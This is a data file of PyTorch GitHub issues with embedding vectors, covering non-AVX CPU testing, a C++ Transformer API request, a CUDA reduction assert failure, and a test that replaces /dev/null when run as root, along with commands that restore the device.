  1.21706247e-01  9.56837088e-04  2.48177350e-02  1.70606896e-01
  5.81431568e-01  2.77532339e-02  2.24955957e-02 -9.36831981e-02
  3.14357787e-01 -6.47154152e-02 -5.71086332e-02 -3.25358659e-01
 -3.22788320e-02  8.07065368e-02 -3.08640301e-01 -2.71566659e-01
 -1.01819739e-01 -6.93430081e-02  1.52406722e-01  2.67051131e-01
 -8.65257010e-02 -9.44352429e-03 -2.60683656e-01  1.26787633e-01
 -1.47163406e-01 -1.91906571e-01 -1.48850471e-01 -8.37095827e-02
  1.85950756e-01  2.00301215e-01 -1.36198282e-01 -7.68871382e-02
 -3.46211731e-01 -3.64971980e-02  3.58189404e-01 -3.72660279e-01
  3.09839606e-01 -5.55999950e-02  3.06794703e-01  2.65720904e-01
  1.52744442e-01  6.76140934e-02  4.73438352e-02  1.13881901e-01
  3.25183570e-01  1.99776709e-01 -2.46998876e-01 -1.96127743e-02
  1.75247371e-01  1.03266381e-01 -2.15406403e-01  7.13266656e-02
 -2.66145110e-01  6.11796565e-02  1.45253107e-01 -4.15636569e-01
  3.77781093e-01  2.93248929e-02  3.91153276e-01 -4.80410635e-01
  4.12967443e-01  4.75094141e-03  7.32865259e-02 -1.38044536e-01
  3.91862452e-01  1.21840052e-01  2.16330260e-01  1.56711876e-01
  3.17910016e-01 -4.35304493e-02 -3.86051893e-01 -3.48100841e-01
 -1.98367625e-01  3.16927209e-02 -1.17649175e-01  2.20236659e-01
  4.19151515e-01 -1.43785596e-01 -4.26388264e-01  2.54389912e-01
  1.04455858e-01  5.88286743e-02 -2.82122165e-01 -1.79358289e-01
 -5.62573314e-01  1.08046323e-01  3.11971843e-01 -2.57425487e-01
 -1.72534108e-01 -2.50351667e-01  4.77542356e-02  1.90468788e-01
  4.44431812e-01 -4.79423344e-01  2.60841489e-01 -7.68809915e-02
 -2.95164287e-01  2.82545954e-01 -3.31745565e-01 -5.62638380e-02
  2.23357454e-01  5.04083931e-01  1.74159408e-01 -2.84280255e-02
 -3.01002026e-01 -2.13646948e-01 -5.15891612e-01  1.09684080e-01
  1.44966871e-01  8.36213380e-02 -5.04482210e-01  1.12000167e-01
 -8.20098724e-03  1.48544461e-01  1.82559296e-01  1.24878943e-01
  1.81750972e-02  1.34708613e-01 -4.16742444e-01  5.83378188e-02
 -1.39012933e-01  5.87320924e-02  3.62633646e-01 -6.30456805e-01
  2.67717019e-02 -3.46493304e-01  1.40617952e-01 -3.65503281e-01
 -2.98713982e-01 -1.66162044e-01  1.35708302e-01  5.56292653e-01
  1.25795662e-01 -9.07707401e-03 -9.18278992e-02 -2.30224971e-02
  1.30394295e-01 -1.01107255e-01 -9.45328400e-02  2.78830111e-01
  3.22966546e-01  2.14403018e-01  3.49986702e-01  3.22629735e-02
 -2.53252983e-02  2.12953627e-01 -2.81601965e-01 -3.12741905e-01
 -7.31402189e-02 -6.35100529e-02 -3.71958196e-01  9.85597074e-02
  4.47847247e-02 -4.13604453e-02 -4.16619182e-01  9.03817043e-02
 -3.92982475e-02  2.71040380e-01  3.71689439e-01 -1.29132271e-01
 -1.17604487e-01  2.26602241e-01  3.95029336e-01  1.17866747e-01
  2.82716513e-01 -3.69488858e-02 -7.31772855e-02 -5.79056814e-02]"
Better testing on CPUs without AVX capabilities module: build module: cpu triaged,"https://github.com/pytorch/pytorch/issues/37577 is the latest occurrence of cases where we broke users with non-AVX CPUs because we accidentally let AVX instructions sneak in to code that isn't guarded by DispatchStub. It would be good to actually test for this case.

According to @colesbury, there are no x86 CPUs on AWS that don't support AVX.

Another test we could do is a limited test to see if our static initializers have any AVX instructions, or files that aren't explicitly intended to be AVX/AVX2 compiled. This might be hard to do robustly.

Possibly related https://github.com/pytorch/pytorch/issues/22338

cc @malfet @VitalyFedyunin",True,"[ 4.30311710e-02  4.33960520e-02 -1.63276762e-01  7.43951499e-02
  7.09995627e-03 -4.08286512e-01 -7.28166997e-02 -1.65371582e-01
 -1.67078435e-01 -5.93792617e-01  1.00422308e-01  1.54185593e-01
 -3.75509143e-01 -3.67871583e-01 -2.60604285e-02 -3.37741047e-01
  1.34079874e-01 -6.51951492e-01  3.41515422e-01 -2.44885862e-01
 -3.80941451e-01 -1.45486929e-02 -2.06349000e-01 -5.70257530e-02
  3.99662852e-02 -2.76825521e-02  1.64815828e-01  1.95949316e-01
 -6.09556437e-02 -5.19633293e-02  6.00857258e-01  1.63047358e-01
  2.47347653e-01 -3.46422374e-01  3.70139852e-02 -1.52916744e-01
  9.73045826e-02 -5.25245547e-01 -4.78025287e-01 -1.62342519e-01
 -8.56730193e-02  3.80633205e-01 -5.64596467e-02 -1.72593206e-01
  6.00079447e-02 -2.71715015e-01 -2.37569045e-02 -2.88976520e-01
 -3.74221355e-02 -2.54268706e-01 -1.93246037e-01 -4.67477515e-02
  3.33672106e-01 -3.85735333e-01  1.19519427e-01 -1.06083214e-01
  1.28372815e-02 -1.08628154e-01 -3.01864326e-01 -3.09162140e-02
  1.94934264e-01 -1.46238193e-01  7.50269592e-02  1.31439194e-01
  1.44881234e-01  1.05226278e-01  2.74606913e-01 -1.94806412e-01
  1.99076265e-01 -5.80381751e-02 -2.48401999e-01 -3.30133915e-01
 -7.54884839e-01  2.73115754e-01 -8.26657712e-02  4.49305266e-01
 -1.50857940e-01 -2.26932123e-01  5.09003341e-01 -1.28037944e-01
 -8.51022974e-02 -3.30482841e-01  4.77479249e-02  1.77033246e-04
  7.77621642e-02  1.06336877e-01  2.64281705e-02  9.35914367e-02
  1.58612393e-02 -1.21422067e-01  3.23551327e-01  1.06912702e-01
  2.07983702e-03  9.36046708e-04  4.58954185e-01  1.16487239e-02
  9.61182490e-02  1.18777514e-01 -3.93806338e-01  4.03430760e-02
 -6.75303861e-02 -1.03001744e-01 -7.64519721e-02  3.10595483e-01
 -4.38571990e-01 -6.29384071e-02  2.91972697e-01  3.86767127e-02
  2.23501623e-01 -5.95517993e-01  1.54339984e-01  1.10513508e-01
  1.67883456e-01 -9.64708626e-02  2.88173556e-01  5.97166419e-02
  4.42872234e-02  1.43276036e-01  2.43009150e-01  4.52727705e-01
 -7.45605230e-02 -2.49834687e-01  1.71972588e-01  1.79876089e-01
  3.36851060e-01  2.24717751e-01 -4.68250304e-01  2.66458988e-01
 -1.81064364e-02  8.72208476e-02  1.64383009e-01 -1.98808521e-01
  5.29677391e-01 -3.15648615e-01  3.38743687e-01  1.82779863e-01
 -1.09451883e-01 -1.12191409e-01  2.21617714e-01 -3.84005457e-02
  2.16177791e-01 -6.83654696e-02  3.60203385e-01 -6.55205129e-03
 -1.61023334e-01  5.64268753e-02 -5.37648201e-02  1.04614273e-02
 -1.58330455e-01 -3.98279399e-01  1.42195709e-02  6.55585527e-02
  1.14452243e-01  4.34899807e-01  1.14141569e-01  5.88240661e-02
  1.94134176e-01  4.32254970e-02 -9.30025242e-03 -1.28451020e-01
 -3.04326922e-01  3.90219510e-01 -1.53661475e-01  3.04108649e-01
  4.06124204e-01 -3.39263901e-02 -4.69294727e-01  2.37248778e-01
  9.40007418e-02  5.64999878e-02 -7.59269074e-02 -5.80216683e-02
  1.41999215e-01 -5.54949880e-01 -4.59612645e-02  4.11886796e-02
  1.58466309e-01  2.76756614e-01 -1.92914441e-01  4.13544238e-01
  1.81832135e-01 -2.08785623e-01  3.06064159e-01  4.44540918e-01
  8.48906636e-02  2.42628083e-01  2.19496518e-01  2.21394181e-01
 -2.71904051e-01 -1.18196368e-01 -4.60150152e-01  5.59447072e-02
 -2.37306178e-01  7.01901242e-02  8.18978772e-02 -1.81203932e-01
 -2.91956097e-01  1.44499332e-01 -5.37093952e-02 -1.28349856e-01
  1.19948909e-01 -2.42149010e-01  2.34152451e-01  1.94062404e-02
 -6.67025074e-02 -5.32444566e-02 -1.43724501e-01 -8.23567659e-02
  2.48199791e-01  2.84559932e-02  1.54869691e-01 -6.02616444e-02
 -2.91457921e-02 -1.52170718e-01 -2.84529150e-01  1.81352273e-01
  2.30708361e-01  2.20013797e-01  1.26426399e-01  4.63415027e-01
 -4.74699214e-02 -2.18434706e-01 -2.19382271e-01 -1.57877922e-01
 -3.58123660e-01 -3.07296753e-01 -4.68337774e-01  4.98970598e-03
 -2.03652978e-01  6.29591942e-02  1.16529725e-01 -9.25376341e-02
  1.79876029e-01 -4.37330663e-01  3.41249764e-01  1.43976197e-01
  6.82293670e-03 -1.58984125e-01 -9.03680623e-02  2.57555932e-01
 -4.83788848e-01 -5.79730034e-01  2.21434943e-02 -6.70744777e-02
  1.03513062e-01  8.28269646e-02  7.23913088e-02  1.51058808e-02
  1.48927018e-01  1.81786731e-01 -1.13625772e-01  4.74007055e-02
  1.94801927e-01 -1.26124144e-01  1.21188298e-01  1.01463452e-01
  8.84171799e-02  3.62601280e-01  6.70380071e-02  5.19140884e-02
  2.56061941e-01  2.56318659e-01  7.40229860e-02  2.63623416e-01
  1.83480326e-02  6.55456856e-02 -3.13959450e-01 -1.41716748e-02
  3.52890678e-02  9.54316482e-02  1.56517118e-01 -4.05822039e-01
  9.82660875e-02 -1.39292240e-01  2.57966548e-01 -2.00178564e-01
  4.09681797e-01  1.95295721e-01 -2.33592600e-01 -1.55924052e-01
  2.30406925e-01  1.05774209e-01 -8.34807456e-02  5.35920560e-02
  1.65897399e-01 -2.36611605e-01  3.25910062e-01 -2.08878160e-01
 -1.28691077e-01 -2.60127902e-01 -2.73008466e-01  3.17948699e-01
  1.52514219e-01  1.96739256e-01 -2.56878883e-01  2.80267410e-02
  8.45807791e-03 -4.44221012e-02 -1.40504330e-01  2.69274831e-01
 -3.24588984e-01 -3.50934774e-01 -1.11164525e-01  1.04524769e-01
 -2.05849439e-01  1.77533612e-01 -2.22818926e-03 -1.04689762e-01
  2.15089291e-01 -3.05313230e-01  2.00072795e-01  2.55499899e-01
  6.83913901e-02  1.18628867e-01 -1.94474727e-01  4.25239094e-02
 -2.87755519e-01  4.21252728e-01 -7.61935040e-02  9.26812142e-02
  1.72237046e-02 -2.07761377e-02 -2.57080674e-01  3.86993915e-01
  2.86280453e-01  7.83577561e-02 -2.25433648e-01 -4.30056870e-01
  3.65679786e-02 -2.12972045e-01  2.13718265e-02 -3.51569057e-01
 -2.63091624e-01  1.30791217e-01  2.92067170e-01  1.97394252e-01
 -1.50613740e-01  1.58641964e-01 -3.70571017e-02 -1.82315499e-01
 -5.19900583e-02  4.70278591e-01 -4.54799607e-02  3.94675910e-01
  2.80868225e-02 -2.72792205e-02  4.20225739e-01 -8.64488035e-02
  2.54029423e-01  2.16865301e-01 -4.87541854e-01  1.59424573e-01
 -2.16179937e-01 -1.23193942e-01 -5.87287769e-02  1.33134037e-01
 -4.47065905e-02  2.94371545e-01  3.69246900e-01  2.01208994e-01
 -3.35851669e-01 -2.14325935e-01 -4.14115161e-01 -9.55344960e-02
  2.08563238e-01  2.38708332e-02 -3.40529174e-01 -1.52032182e-01
  3.29549313e-01  1.67906865e-01  1.08855784e-01  4.06007841e-02
 -2.42154986e-01  1.76058769e-01  8.47296044e-02 -1.20099753e-01
 -1.41355440e-01 -3.59807670e-01  7.59154409e-02 -1.38635293e-01
  7.64467195e-03  1.36395156e-01  1.81427196e-01  9.90225673e-02]"
C++ API for Transformer model in libtorch 1.5.0 module: cpp triaged oncall: transformer/mha,"In the latest 1.5 release, I am unable to find Transformer model api in C++ (equivalent to the torch.nn.Transformer in its python counterpart). Any timeline for its implementation in C++?

cc @yf225 @glaringlee",True,"[-7.05958188e-01 -1.80457309e-01 -2.92154223e-01 -4.64377627e-02
 -2.55290300e-01 -3.18138744e-03 -3.62726778e-01  1.90624803e-01
 -2.68817604e-01 -9.61523782e-03 -1.13618977e-01 -2.49019623e-01
 -1.88349724e-01  3.04178268e-01  2.79989764e-02  7.78543279e-02
 -4.40765291e-01 -2.14696154e-01  1.41846672e-01 -3.19384545e-01
  1.99177071e-01  2.25621596e-01 -1.72539100e-01  6.83303624e-02
  1.92320496e-01 -2.54909694e-01  2.19033405e-01 -5.84470689e-01
  6.55383766e-02 -8.19400549e-02 -2.36849990e-02 -1.19744882e-01
 -2.37587094e-01  9.38989818e-02  6.20364211e-02 -2.65878558e-01
 -1.74830273e-01  4.06381153e-02 -5.46555482e-02 -1.05093643e-01
  2.23360416e-02  1.74583972e-01 -3.08643002e-02  2.62300558e-02
 -4.29607322e-03 -2.44828872e-02 -1.15360156e-01  5.27720936e-02
 -4.08570081e-01 -1.62690520e-01  2.94892311e-01 -1.87119424e-01
  3.29841562e-02 -3.95618714e-02  2.54465163e-01 -1.40636429e-01
 -4.34792265e-02 -1.22872412e-01  2.58741260e-01 -1.71299189e-01
  8.96165445e-02 -1.29787385e-01  1.28647253e-01 -1.83198769e-02
 -1.74315125e-01  4.16718662e-01 -9.58924927e-03 -3.38407695e-01
  1.75071076e-01 -1.24561973e-01 -4.56708401e-01 -3.00934076e-01
  6.89086467e-02 -3.20903122e-01 -1.99969988e-02 -4.61702883e-01
 -9.93682221e-02  3.70296896e-01 -4.16707024e-02 -1.76122382e-01
  1.57460690e-01  4.83100638e-02 -1.10833123e-01  2.83824682e-01
  2.11743563e-01 -1.67067260e-01 -2.39741862e-01 -9.80739594e-02
  1.84291169e-01  2.76479274e-01  8.79756287e-02  1.49049971e-03
 -1.54792458e-01  3.32538038e-01 -3.11906904e-01  7.23459572e-02
 -3.35636400e-02 -1.54698402e-01 -4.32340689e-02  2.61339941e-03
 -1.81192189e-01 -5.85584678e-02 -2.96931379e-02  1.83933884e-01
  1.59771964e-01 -7.44617581e-02  1.43508747e-01  1.52979910e-01
  7.71645978e-02 -9.68513563e-02  1.92472577e-01  1.19098872e-01
  3.41682066e-03 -2.43435219e-01  1.61648080e-01  2.38680467e-01
 -9.35502648e-02  7.88687915e-02  8.07740390e-02  1.49309114e-01
  2.94028111e-02 -1.02438241e-01  1.54589256e-02  4.09972906e-01
 -9.61203575e-02  2.99010366e-01  1.96967430e-05 -1.87965721e-01
 -7.31742978e-02  3.40358555e-01  1.88211858e-01  2.68858939e-01
 -1.77268043e-01 -2.47994512e-01  5.42211890e-01  3.58939290e-01
 -2.11213201e-01 -3.62646669e-01 -8.50052983e-02 -1.69151589e-01
 -1.61921650e-01  3.21770966e-01 -2.15163797e-01 -3.01080883e-01
  2.42611513e-01 -9.56353098e-02 -1.79880470e-01 -1.68318977e-03
 -5.36743961e-02  7.68723488e-02  1.41142726e-01 -8.62088501e-02
 -1.78553060e-01  2.66676068e-01  2.68644273e-01  8.98226574e-02
  7.59990215e-02 -2.16461569e-01  5.25725037e-02  2.70621590e-02
  7.00174794e-02  4.02543277e-01  2.23340660e-01  1.67105302e-01
  1.71226189e-01 -1.50605151e-02 -2.68849850e-01 -1.15836442e-01
  1.02877833e-01  1.14348710e-01 -2.99964659e-02 -2.05297932e-01
  1.47172570e-01 -9.18754563e-02  2.41844431e-01 -4.12444696e-02
  1.38076469e-01 -1.61869437e-01 -1.45126864e-01  2.86436290e-01
 -2.41149485e-01  3.09072942e-01  4.62423980e-01 -1.96434394e-01
 -5.42343482e-02  3.26644741e-02  4.78235483e-01 -2.61177532e-02
 -9.07418951e-02  2.28084587e-02 -1.94634318e-01 -2.02451378e-01
 -7.66615272e-02 -1.41776800e-01 -1.83930144e-01 -2.23792240e-01
 -6.57253340e-02  1.11556850e-01  1.08287580e-01  1.49092004e-01
 -8.01740140e-02  1.89009625e-02  2.69074827e-01  1.00945942e-01
 -1.40124261e-01  2.07163021e-01 -2.94998676e-01 -2.43370477e-02
 -1.98633283e-01  2.62680948e-01  1.36157691e-01 -2.44917586e-01
  1.90161318e-01 -3.05139154e-01 -8.40143021e-03  2.06321284e-01
 -2.42641699e-02 -1.32449150e-01 -2.22578719e-01  3.21082294e-01
  1.12251155e-01  1.49459273e-01  2.76125610e-01 -1.90018062e-02
  8.95823985e-02 -1.30867064e-01 -1.93361584e-02 -1.15286559e-01
 -1.06850177e-01 -1.62106276e-01 -1.17957957e-01 -8.63184854e-02
  5.05641215e-02  1.67307898e-01  2.16522008e-01  1.33517116e-01
  1.61133572e-01  2.88425870e-02  2.18613148e-01 -7.89932087e-02
 -3.13694298e-01 -4.14301097e-01  2.54955050e-03 -1.01741031e-01
  2.46191174e-02  2.54648030e-01 -3.62050503e-01 -1.30368426e-01
 -9.05753598e-02  2.66350240e-01 -2.07388252e-01  3.07315588e-01
  2.80675918e-01 -1.25863589e-02  7.22761080e-02  1.26164466e-01
  1.81289196e-01 -9.93404463e-02 -2.92734712e-01 -5.38632609e-02
 -5.63050993e-02  3.33615005e-01 -6.18385747e-02  1.07914552e-01
  1.25481486e-01  5.04497858e-03  1.21588096e-01  3.72902453e-01
 -2.68457942e-02 -5.59628010e-02  2.85044104e-01 -2.92277664e-01
  1.18308783e-01  2.68594831e-01  2.94700444e-01 -4.81894426e-03
  2.12261621e-02 -2.36396432e-01 -6.44120127e-02  4.23880527e-03
  2.06867799e-01  2.04598635e-01 -3.46952938e-02  3.22289169e-02
 -2.48038068e-01 -1.51710942e-01  9.86960977e-02 -2.39197209e-01
 -2.14299694e-01 -1.02583691e-01  8.65672678e-02 -9.16496571e-03
  3.69783729e-01 -1.83161542e-01 -1.43350109e-01  6.96533024e-02
  4.47749197e-02 -2.92427510e-01 -1.15992799e-02 -4.47032154e-01
 -8.27907622e-02  1.04140662e-01 -1.00566767e-01 -1.99507996e-01
 -1.06157549e-01 -1.10068604e-01  4.05890584e-01  2.06890583e-01
  3.56907308e-01 -3.73749524e-01  2.42904991e-01 -1.70298275e-02
  1.17973490e-02  3.11686397e-01 -2.52887607e-01  1.88712686e-01
 -3.49064797e-01  1.44339204e-01  8.05039629e-02  9.16865841e-02
 -2.04901949e-01  1.36310473e-01 -1.95029959e-01 -1.07790969e-01
  1.10585794e-01  1.68463022e-01  3.23779821e-01  1.01103917e-01
 -2.91753829e-01  1.42590091e-01 -8.11485797e-02  1.47724271e-01
  3.37600499e-01  2.67964512e-01 -3.29534560e-02 -4.76810448e-02
 -1.46481231e-01  1.91645369e-01 -5.35656214e-02 -1.22563578e-01
 -1.01377882e-01  1.50776114e-02 -6.30779192e-02 -3.52650553e-01
 -3.31083864e-01 -1.31736904e-01  9.68447179e-02  3.13689142e-01
 -1.89656928e-01 -5.46409702e-03  2.43160669e-02  3.85126203e-01
  6.96844086e-02 -1.74462665e-02  6.17307685e-02  2.44607255e-01
  3.17029536e-01 -5.20408526e-02  4.37844902e-01  2.49724492e-01
 -3.65738273e-02  3.54676068e-01 -1.57089278e-01  4.79496084e-02
 -1.76164776e-01 -2.12727115e-01  1.05866767e-01 -5.32968044e-01
 -8.53501782e-02  5.98915696e-01 -2.88776278e-01  1.78758428e-01
 -9.10705775e-02  8.20917115e-02  1.57698005e-01 -4.58008703e-03
  1.79615214e-01 -3.10304701e-01 -1.17659763e-01  1.97663218e-01
  2.32755262e-02 -1.53832287e-01  5.31423204e-02 -2.32852399e-01]"
"""sub_iter.strides(0)[0] == 0 INTERNAL ASSERT FAILED at Reduce.cuh"" when doing .sum() on large cuda tensor high priority module: cuda module: memory usage triaged module: reductions","## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->
Calling `.sum()` on large cuda tensors throws the error.

## To Reproduce

Steps to reproduce the behavior:

```
import torch
t = torch.zeros(5, 14400, 14400).cuda()
!nvidia-smi
t.sum(dim=0)
```
shows the following nvidia info
```
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 440.64.00    Driver Version: 418.67       CUDA Version: 10.1     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  Tesla P100-PCIE...  Off  | 00000000:00:04.0 Off |                    0 |
| N/A   40C    P0    32W / 250W |   4663MiB / 16280MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID   Type   Process name                             Usage      |
|=============================================================================|
+-----------------------------------------------------------------------------+
```
and the traceback is
```
RuntimeError                              Traceback (most recent call last)
<ipython-input-1-bbe24183337c> in <module>()
      2 t = torch.zeros(5, 14400, 14400).cuda()
      3 get_ipython().system('nvidia-smi')
----> 4 t.sum(dim=0)

RuntimeError: sub_iter.strides(0)[0] == 0 INTERNAL ASSERT FAILED at /pytorch/aten/src/ATen/native/cuda/Reduce.cuh:706, please report a bug to PyTorch. 
```

This behavior is reproduced with any `(n, 14400, 14400)` tensor for `n>=5`.

**Note**. I can easily create a (6, 14400, 14400) tensor - memory usage, in this case, is `5455MiB / 16280MiB`.


## Expected behavior
Returns a (14400, 14400) tensor


## Environment

PyTorch version: 1.5.0+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.12.0

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Tesla P100-PCIE-16GB
Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.3
[pip3] pytorch-mighty==0.1.0
[pip3] torch==1.5.0+cu101
[pip3] torchfile==0.1.0
[pip3] torchsummary==1.5.1
[pip3] torchtext==0.3.1
[pip3] torchvision==0.6.0+cu101
[conda] Could not collect


## Additional context

Google colab, GPU instance.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @heitorschueroff",True,"[-0.31925943 -0.2995932  -0.21532333 -0.03868024 -0.15291162 -0.4118612
  0.02546005  0.12139387 -0.25380474 -0.09560379  0.0707285   0.01199825
 -0.03119584  0.09391343 -0.33309266  0.04157972  0.00162218  0.1902222
 -0.24566783 -0.01506856  0.04970097 -0.10180153 -0.18536642  0.09459167
  0.23242635  0.09062283 -0.06328356 -0.19546485  0.48718446 -0.29802847
  0.12108123 -0.00343358 -0.00736179  0.16804385 -0.28858632  0.30863255
 -0.42196387 -0.18027839  0.10690071 -0.06408445 -0.07571726 -0.09284103
  0.10646818  0.07003619  0.03240101  0.00629712 -0.02782036  0.20320669
 -0.13740827  0.07030806  0.03539597  0.2516418   0.02714137 -0.2597056
  0.05940244  0.04532108 -0.06859414 -0.10072425 -0.01385313 -0.22358526
  0.17635329 -0.00217829 -0.16316956  0.0201134   0.35396874  0.11276747
  0.09209138  0.05991077  0.40408477  0.3167352   0.21732576  0.26986575
 -0.30058187 -0.01566148 -0.07047153  0.22304139 -0.06033375  0.33422115
 -0.06714107 -0.11928655 -0.00289744  0.11093663  0.02964064 -0.23912445
  0.06509383  0.05364895  0.35158426 -0.07942186  0.36543742 -0.40148202
  0.25910395 -0.01452012 -0.25517568  0.16785935 -0.10718812 -0.09715684
  0.03891328  0.00951748 -0.26133198 -0.12745793 -0.10566127 -0.13864538
 -0.1546768   0.3051127  -0.16703051 -0.11255923  0.06846187  0.13281973
  0.10390331  0.18183005  0.36093575 -0.15537736  0.22046615  0.20024472
  0.00612436 -0.13227324 -0.04786089 -0.27073497 -0.00332658  0.07743727
 -0.0399789   0.1080782   0.07255679  0.15852438 -0.03240047  0.1849061
  0.14276832 -0.21707174 -0.34301525 -0.10035163  0.15925741 -0.16170362
 -0.01728064 -0.16072418 -0.04743205  0.2364004  -0.2639287   0.0724723
 -0.22197309 -0.04661963  0.02132593  0.0529358  -0.16501483 -0.3173672
  0.53715384  0.14001873 -0.17534274 -0.02638246  0.2343895   0.1149106
 -0.09929984  0.03601224 -0.4083117   0.2326963   0.04636469  0.18365082
  0.20782728 -0.05672742  0.0875663  -0.6049374   0.24351412  0.41889036
  0.15299103  0.04874554  0.05368027  0.30919528 -0.05007723 -0.08301632
 -0.23186989  0.3772908  -0.20807706 -0.18068093 -0.14660525 -0.0940941
  0.34926733 -0.17100729 -0.36827782 -0.40084544 -0.03948847  0.28525525
  0.16783977  0.39634633  0.37828827 -0.12861332  0.08403078  0.15229447
  0.22068065  0.27704084 -0.10490023 -0.13437293 -0.52806664 -0.22975616
 -0.1591439   0.02514195 -0.07100889  0.25317323  0.19048476 -0.0832421
 -0.10843594  0.15638617 -0.22778602 -0.13106921  0.01257423 -0.07906509
  0.13234782 -0.192081   -0.22975256 -0.6872095   0.08216216  0.04628279
 -0.38370824 -0.5722485  -0.086847   -0.04570302 -0.11224246  0.03699966
 -0.09393996 -0.03007036 -0.28679192  0.31357944  0.34269568  0.292311
  0.23786609 -0.23013586  0.17324059 -0.00182035 -0.02164266 -0.17664981
  0.04876     0.09046803  0.13625616 -0.303006   -0.04668476 -0.06011845
 -0.15759225  0.21175338 -0.05243108  0.00299241  0.13365108  0.00147828
 -0.12885672 -0.0636778  -0.04969696  0.12361747  0.15636423  0.3844434
 -0.08692544  0.054027   -0.41850114  0.0653255   0.06629459 -0.01400311
  0.03960708 -0.15560582  0.20470726 -0.02801289  0.17705607 -0.14014086
 -0.14119527 -0.09426446  0.32864064  0.48301566 -0.05350453  0.31178167
  0.07392196  0.00125071 -0.18027443  0.24215128  0.06602662 -0.06117956
 -0.10709612 -0.24718212  0.24799207 -0.36017182  0.03751859 -0.38477927
  0.57733846  0.02680672  0.13436002 -0.02853998  0.20561627  0.03678692
 -0.0900964   0.16370627  0.11932638 -0.3028277  -0.14912468 -0.20733164
 -0.02767288 -0.23417899 -0.23451367  0.41216522  0.31240684 -0.21617588
 -0.28256056  0.31155324  0.2023568   0.04232427 -0.06818481 -0.1336821
 -0.23681653 -0.07766034  0.2985987  -0.19307695 -0.24360211  0.01708185
  0.20687664  0.03063789  0.13652584 -0.21248302  0.36697513  0.00990343
 -0.24696527  0.33502543 -0.21497467  0.08657067  0.17846651  0.44914448
  0.10650469  0.09439641 -0.2624948  -0.5147283  -0.22094616 -0.12351052
  0.0400707  -0.00541503 -0.25131226  0.2598087  -0.07134143  0.14380997
  0.06217604  0.02470135 -0.01014483  0.1525038  -0.24007691 -0.07631762
 -0.07178794  0.06480704  0.04498248 -0.3089107  -0.17636593 -0.19452912
 -0.16641931 -0.32928288 -0.06795909 -0.2836082   0.23731038  0.53240013
 -0.13109156 -0.10901693 -0.07203452  0.12596929  0.1746485   0.05967766
  0.12929937  0.4231447   0.33239883  0.11750799  0.16987053  0.08889237
  0.03355649  0.07373804 -0.13992706 -0.00962333 -0.0552414  -0.08551902
 -0.14890492 -0.17433454  0.39883974  0.15897289 -0.25188226  0.19870144
 -0.05677488  0.3848268   0.6083448  -0.28606617 -0.19708352 -0.13198496
  0.31137484  0.17217094  0.31789064 -0.0279618   0.04494448 -0.0897138 ]"
Running python tests as root breaks the /dev/null file oncall: distributed triaged,"## ðŸ› Bug

Running python tests as root breaks the `/dev/null` file

## To Reproduce

Steps to reproduce the behavior:

1. `su - root`
1. `python3 test/run_tests.py -v -pt`

After that the `/dev/null` file is no longer a character device file but a plain one.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

It should not break things of the system.

## Environment

Linux

## Additional context

I've found the root of the problem:

`test_c10d.py` has a test case that creates a `c10d.FileStore(""/dev/null"", 1)` instance:
https://github.com/pytorch/pytorch/blob/master/test/distributed/test_c10d.py#L2956

And the `c10d.FileStore` object will remove the file specified by that path upon destruction:
https://github.com/pytorch/pytorch/blob/master/torch/lib/c10d/FileStore.cpp#L229

Should anyone encountered this issue, it can be fixed by simple re-creating the `/dev/null` file:

```shell
rm -f /dev/null
 mknod -m 666 /dev/null c 1 3
```

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar",True,"[-0.23823763 -0.4518025   0.0447529  -0.2540241  -0.06408253 -0.38481757
 -0.11377333  0.07241812 -0.6191513  -0.24133742  0.12728965  0.06390475
  0.00370486  0.22057733 -0.04904747 -0.11243749 -0.15632582 -0.4301945
  0.05960346  0.18114686  0.11663006  0.1593256  -0.14847395  0.04872565
 -0.09211197 -0.0460101  -0.0224524  -0.00394162  0.1232342   0.06127368
  0.26438528  0.15735003 -0.2541561   0.04935292  0.33293873  0.21881503
 -0.3569419  -0.39760876 -0.08434023 -0.06107336  0.20076406 -0.06111928
 -0.15978801  0.01446666 -0.08126065 -0.10680158 -0.15411547  0.1717238
 -0.0735738  -0.12119769  0.24279872  0.17362604  0.03206183 -0.29717186
  0.24488038 -0.32269228 -0.00622691  0.2191639   0.08009239  0.0128288
  0.1167952   0.19780077 -0.08920447  0.0228888   0.3119151   0.37525058
  0.06781788 -0.16284826  0.35489503  0.2255171  -0.0665547   0.05290461
 -0.32515365 -0.027189   -0.11354836  0.07231194 -0.31583142 -0.09107048
 -0.16640863 -0.24834116 -0.17299694 -0.10452317  0.00772429  0.06811661
 -0.0010791  -0.20199107  0.1335625  -0.26362342  0.21569815  0.20491907
  0.11677942 -0.00270247 -0.07627893  0.24295904 -0.07416087  0.18646121
  0.14459229 -0.21490273  0.08489074  0.06016233  0.01586324 -0.29520506
 -0.05899727  0.02425838 -0.09802599 -0.08577206  0.11700532  0.0347458
  0.24613497 -0.01383394  0.16620311 -0.07718153 -0.03475352 -0.05499795
  0.14268379  0.10347912  0.1342426   0.30978173 -0.20591088  0.20489211
  0.2489855  -0.16765974  0.11050917  0.16680266  0.3051511  -0.00768949
  0.00663589  0.10040782 -0.1658765  -0.04399192  0.1494792   0.06497934
 -0.15980983 -0.09608445  0.07606323  0.39620054 -0.09551813 -0.05166828
  0.08787421 -0.133479   -0.25721717 -0.36099756 -0.15919234 -0.33300337
  0.10436545 -0.2986622  -0.5764766   0.55925167  0.05247277 -0.20088291
  0.07698097  0.15255114 -0.34028512  0.12395927  0.08294155 -0.00091577
